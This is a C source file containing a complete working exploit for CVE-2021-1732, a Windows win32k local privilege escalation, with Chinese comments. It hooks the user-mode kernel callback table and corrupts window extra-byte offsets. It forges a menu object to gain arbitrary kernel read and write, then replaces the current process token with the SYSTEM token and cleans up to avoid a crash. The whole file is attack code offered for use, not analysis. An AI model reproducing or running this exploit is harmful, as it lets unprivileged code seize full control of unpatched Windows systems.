#include "CVE-2021-1732.h"

lpfnxxxClientAllocWindowClassExtraBytes g_orgClientAllocWindowExtraBytes = NULL;
lpfnNtCallbackReturn fnNtCallbackReturn = NULL;
lpfnNtUserConsoleControl fnNtUserConsoleControl = NULL;
HWND g_hWnd[55] = { NULL };
ULONG64 g_pWnd[55] = { NULL };
HWND g_hTriggerWnd = NULL;
DWORD g_dwWndExtra = 0x1900;
DWORD CONST g_dwWinNum = 50, g_cbWndExtra_offset = 0xC8, g_ExtraBytes_offset = 0x128;
QWORD g_qwKernelHeapOffset0 = 0, g_qwKernelHeapOffset1 = 0, g_qwWndOffset = 0;
QWORD g_qwMenu = 0;

BOOL Exploit_CVE_2021_1732()
{
	BOOL bRet = TRUE;

	if (!Init_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}
	
	if (!HookFunc_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}

	// 初始化用来触发漏洞的窗口
	if (!InitTriggerWnd())
	{
		bRet = FALSE;
		goto exit;
	}

	// 将g_hWnd[0]的cbwndExtra设为0xFFFFFFFF
	if (!SetWindowLongPtr(g_hTriggerWnd, g_cbWndExtra_offset, 0xFFFFFFFF) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// g_hWnd[1]的style加入WS_CHILD 
	DWORD dwStyleOffset = 0x18;
	QWORD qwStyle = *(PQWORD)(g_pWnd[1] + dwStyleOffset);

	qwStyle |= 0x4000000000000000;
	
	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 将伪造的tagMENU设置到g_hWnd[1]中
	QWORD qwSPMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, g_qwMenu);
	
	if (!qwSPMenu && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 删除g_hWnd[1]的WS_CHILD
	qwStyle &= ~0x4000000000000000;
	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 提权
	if (!EnablePrivileges_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}

	// 修复数据，防止蓝屏
	lHMValidateHandle HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	QWORD qwTriggerHead = (QWORD)HMValidateHandle(g_hTriggerWnd, TYPE_WINDOW);
	QWORD qwWndOffset = *(PQWORD)(g_pWnd[0] + g_ExtraBytes_offset);
	QWORD qwTriggerOffset = *(PQWORD)(qwTriggerHead + 8);

	if (qwWndOffset > qwTriggerOffset)
	{
		printf("qwWndOffset to larger\n");
		goto exit;
	}

	qwWndOffset = qwTriggerOffset - qwWndOffset;

	DWORD dwFlagsOffset = 0xE8;

	DWORD dwFlags = *(PDWORD)(qwTriggerHead + dwFlagsOffset);
	
	dwFlags &= ~0x800;
	if (!SetWindowLongPtr(g_hWnd[0], qwWndOffset + dwFlagsOffset, dwFlags) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	QWORD qwBuffer = (QWORD)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_dwWndExtra);
	if (!qwBuffer)
	{
		bRet = FALSE;
		ShowError("HeapAlloc", GetLastError());
		goto exit;
	}

	if (!SetWindowLongPtr(g_hWnd[0], qwWndOffset + g_ExtraBytes_offset, qwBuffer) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 增加g_hWnd[1]的WS_CHILD
	qwStyle |= 0x4000000000000000;
	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 恢复g_hWnd[1]的spMenu
	if (!SetWindowLongPtr(g_hWnd[1], GWLP_ID, qwSPMenu) && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	// 删除g_hWnd[1]的WS_CHILD
	qwStyle &= ~0x4000000000000000;
	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + dwStyleOffset, qwStyle) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL EnablePrivileges_CVE_2021_1732()
{
	BOOL bRet = TRUE;
	CONST DWORD dwLinkOffset = 0x2F0, dwPIDOffset = 0x2E8, dwTokenOffset = 0x360;

	QWORD qwSytemAddr = GetSystemProcess();
	if (!qwSytemAddr)
	{
		bRet = FALSE;
		goto exit;
	}
	 
	// 获取system进程EPROCESS的地址和Token
	QWORD qwEprocess = ReadData_CVE_2021_1732(qwSytemAddr);
	QWORD qwSystemToken = ReadData_CVE_2021_1732(qwEprocess + dwTokenOffset);

	// 找到当前进程的EPROCESS
	QWORD qwCurPID = GetCurrentProcessId(), qwPID = 0;

	do {
		qwEprocess = ReadData_CVE_2021_1732(qwEprocess + dwLinkOffset) - dwLinkOffset;
		qwPID = ReadData_CVE_2021_1732(qwEprocess + dwPIDOffset);
	} while (qwPID != qwCurPID);
	
	// 替换Token
	if (!WriteData_CVE_2021_1732((PVOID)(qwEprocess + dwTokenOffset), qwSystemToken))
	{
		bRet = FALSE;
		goto exit;
	}
	
exit:
	return bRet;
}

QWORD ReadData_CVE_2021_1732(QWORD pTarAddress)
{
	BYTE bValue[0x8] = { 0 };

	RECT Rect = { 0 };
	if (!GetWindowRect(g_hWnd[1], &Rect))
	{
		ShowError("GetWindowRect", GetLastError());
		goto exit;
	}

	MENUBARINFO mbi = { 0 };

	mbi.cbSize = sizeof(mbi);
	*(PQWORD)(*(PQWORD)(g_qwMenu + 0x58)) = pTarAddress - 0x40;
	
	if (!GetMenuBarInfo(g_hWnd[1], -3, 1, &mbi))
	{
		ShowError("GetMenuBarInfo", GetLastError());
		goto exit;
	}

	*(PDWORD)bValue = mbi.rcBar.left - Rect.left;
	*(PDWORD)(bValue + 4) = mbi.rcBar.top - Rect.top;

exit:
	return *(PQWORD)bValue;
}

BOOL WriteData_CVE_2021_1732(PVOID pTarAddress, QWORD qwValue)
{
	BOOL bRet = TRUE;

	if (!SetWindowLongPtr(g_hWnd[0], g_qwWndOffset + g_ExtraBytes_offset, (QWORD)pTarAddress) &&
		GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

	if (!SetWindowLongPtr(g_hWnd[1], 0, qwValue) && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("SetWindowLongPtr", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL Init_CVE_2021_1732()
{
	BOOL bRet = TRUE;
	DWORD i = 0;

	lHMValidateHandle HMValidateHandle = NULL;

	HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	if (!HMValidateHandle)
	{
		bRet = FALSE;
		goto exit;
	}

	HMODULE hNtDll = NULL, hWin32Dll = NULL;

	hNtDll = LoadLibrary("ntdll.dll");
	hWin32Dll = LoadLibrary("win32u.dll");

	if (!hNtDll || !hWin32Dll)
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	fnNtCallbackReturn = (lpfnNtCallbackReturn)GetProcAddress(hNtDll, "NtCallbackReturn");
	fnNtUserConsoleControl = (lpfnNtUserConsoleControl)GetProcAddress(hWin32Dll, "NtUserConsoleControl");

	if (!fnNtCallbackReturn || !fnNtUserConsoleControl)
	{
		bRet = FALSE;
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	WNDCLASSEX wndClass = { 0 };
	PCHAR pClassName = "leak";

	wndClass.cbWndExtra = 0x20;
	wndClass.cbSize = sizeof(wndClass);
	wndClass.style = CS_VREDRAW | CS_HREDRAW;
	wndClass.hInstance = handle;
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.lpszClassName = pClassName;

	if (!RegisterClassEx(&wndClass))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	HMENU hMenu = NULL, hHelpMenu = NULL;
	HWND hWnd = NULL;

	for (i = 0; i < g_dwWinNum; i++)
	{
		if (i == 1)
		{
			// 从第1个tagWND开始将带有tagMENU对象
			hMenu = CreateMenu();
			hHelpMenu = CreateMenu();
			if (!hMenu || !hHelpMenu)
			{
				bRet = FALSE;
				ShowError("CreateMenu", GetLastError());
				goto exit;
			}

			if (!AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about")) &&
				!AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help")))
			{
				bRet = FALSE;
				ShowError("AppendMenu", GetLastError());
				goto exit;
			}
		}

		hWnd = CreateWindowEx(WS_EX_NOACTIVATE,
							  pClassName,
							  NULL,
			                  WS_DISABLED,
							  0, 0, 0, 0,
							  NULL, 
							  hMenu, 
							  handle,
			                  NULL);
		if (!hWnd)	continue;

		g_hWnd[i] = hWnd;
		g_pWnd[i] = (ULONG64)HMValidateHandle(hWnd, TYPE_WINDOW);

		if (i == 0)
		{
			g_qwKernelHeapOffset0 = *(PQWORD)(g_pWnd[i] + 8);
			BYTE bInfo[0x10] = { 0 };
			*(HWND *)bInfo = g_hWnd[0];
			fnNtUserConsoleControl(6, bInfo, sizeof(bInfo));

			g_qwWndOffset = *(PQWORD)(g_pWnd[i] + g_ExtraBytes_offset);
		}
	}

	for (i = 2; i < g_dwWinNum; i += 2)
	{
		if (g_hWnd[i])
		{
			DestroyWindow(g_hWnd[i]);
		}
	}

	g_qwKernelHeapOffset1 = *(PQWORD)(g_pWnd[1] + 8);

	if (g_qwWndOffset > g_qwKernelHeapOffset1)
	{
		bRet = FALSE;
		printf("g_pWnd[0] offset is invalid!\n");
		goto exit;
	}

	g_qwWndOffset = g_qwKernelHeapOffset1 - g_qwWndOffset;

	// 伪造tagMENU
	HANDLE hProcHeap = NULL;

	hProcHeap = GetProcessHeap();
	if (!hProcHeap)
	{
		bRet = FALSE;
		ShowError("GetProcessHeap", GetLastError());
		goto exit;
	}

	DWORD dwHeapFlags = HEAP_ZERO_MEMORY;
	g_qwMenu = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0xA0);
	if (!g_qwMenu)
	{
		bRet = FALSE;
		ShowError("GetProcessHeap", GetLastError());
		goto exit;
	}

	*(PQWORD)(g_qwMenu + 0x98) = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0x20);
	*(PQWORD)(*(PQWORD)(g_qwMenu + 0x98)) = g_qwMenu;

	*(PQWORD)(g_qwMenu + 0x28) = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0x200);
	*(PQWORD)(*(PQWORD)(g_qwMenu + 0x28) + 0x2C) = 1;
	*(PQWORD)(g_qwMenu + 0x58) = (QWORD)HeapAlloc(hProcHeap, dwHeapFlags, 0x8);
	*(PDWORD)(g_qwMenu + 0x40) = 1;
	*(PDWORD)(g_qwMenu + 0x44) = 2;

exit:
	return bRet;
}

NTSTATUS MyxxxClientAllocWindowClassExtraBytes(PVOID arg0)
{
	if (*(PDWORD)arg0 == g_dwWndExtra)
	{
		HWND hTriggerWnd = NULL;
		DWORD i = 0;

		for (i = 2; i < g_dwWinNum; i += 2)
		{
			if (g_hWnd[i])
			{
				DWORD cbWndExtra = *(PDWORD)(g_pWnd[i] + g_cbWndExtra_offset);
				if (cbWndExtra == g_dwWndExtra)
				{
					hTriggerWnd = (HWND)*(PULONG64)g_pWnd[i];	
					break;
				}
			}
		}

		if (hTriggerWnd)
		{	
			BYTE bInfo[0x10] = { 0 };

			// tagWND->Flag |= 0x800
			*(HWND *)bInfo = hTriggerWnd;
			fnNtUserConsoleControl(6, bInfo, sizeof(bInfo));
			
			BYTE bRes[0x18] = { 0 };

			// 设置tagWND->pExtraBytes
			*(PULONG64)bRes = g_qwKernelHeapOffset0;
			return fnNtCallbackReturn(bRes, sizeof(bRes), 0);
		}
		else printf("do not find hTriggerWnd\n");
	}

	return g_orgClientAllocWindowExtraBytes(arg0);
}

BOOL InitTriggerWnd()
{
	BOOL bRet = TRUE;

	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	PCHAR pClassName = "Trigger";
	WNDCLASSEX wndClass = { 0 };

	wndClass.cbSize = sizeof(wndClass);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.style = CS_VREDRAW | CS_HREDRAW;
	wndClass.cbWndExtra = g_dwWndExtra;			// 指定特定的大小
	wndClass.hInstance = handle;
	wndClass.lpszClassName = pClassName;

	if (!RegisterClassEx(&wndClass))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	g_hTriggerWnd = CreateWindowEx(WS_EX_NOACTIVATE,
							       pClassName,
								   NULL,
								   WS_DISABLED,
								   0, 0, 0, 0,
								   NULL,
								   NULL,
								   handle,
								   NULL);

	if (!g_hTriggerWnd)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL POC_CVE_2021_1732()
{
	BOOL bRet = TRUE;

	if (!Init_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}
	
	if (!HookFunc_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!InitTriggerWnd())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!SetWindowLongPtr(g_hTriggerWnd, 0, 1234) && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}
	
exit:
	return bRet;
}

BOOL HookFunc_CVE_2021_1732()
{
	BOOL bRet = TRUE;
	ULONG64 ulKernelCallBackTable = *(PULONG64)(__readgsqword(0x60) + 0x58);

	DWORD dwOldProtect = 0;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, PAGE_READWRITE, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	g_orgClientAllocWindowExtraBytes = (lpfnxxxClientAllocWindowClassExtraBytes)*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7B);
	*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7B) = (ULONG64)MyxxxClientAllocWindowClassExtraBytes;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, dwOldProtect, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}
